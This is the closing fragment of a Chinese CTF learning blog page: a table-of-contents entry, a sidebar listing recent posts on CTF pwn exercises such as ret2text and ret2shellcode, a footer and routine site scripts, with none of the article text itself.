href="#0x02%E7%BC%96%E5%86%99exp"><span class="toc-number">2.</span> <span class="toc-text">0x02编写exp</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/09/23/ctf-wiki%E5%9F%BA%E6%9C%ACROP2-ret2shellcode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="ret2shellcode">ret2shellcode</a><time datetime="2023-09-23T05:54:51.000Z" title="发表于 2023-09-23 13:54:51">2023-09-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/09/23/ctf-wiki%E5%9F%BA%E6%9C%ACROP1-ret2text%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="ctf-wiki基本ROP1-ret2text学习笔记">ctf-wiki基本ROP1-ret2text学习笔记</a><time datetime="2023-09-23T05:49:42.000Z" title="发表于 2023-09-23 13:49:42">2023-09-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/09/23/hexo%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%8A%9F%E8%83%BD%E9%85%8D%E7%BD%AE/" title="hexo文件下载功能配置">hexo文件下载功能配置</a><time datetime="2023-09-23T01:58:20.000Z" title="发表于 2023-09-23 09:58:20">2023-09-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/09/23/PolarCTF/" title="PolarCTF_PWN_WP">PolarCTF_PWN_WP</a><time datetime="2023-09-23T01:42:10.000Z" title="发表于 2023-09-23 09:42:10">2023-09-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/09/22/BUUCTF%EF%BC%885%EF%BC%89-pwn1-sctf-2016/" title="BUUCTF（5）-pwn1-sctf-2016">BUUCTF（5）-pwn1-sctf-2016</a><time datetime="2023-09-22T09:17:55.000Z" title="发表于 2023-09-22 17:17:55">2023-09-22</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By YunL</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
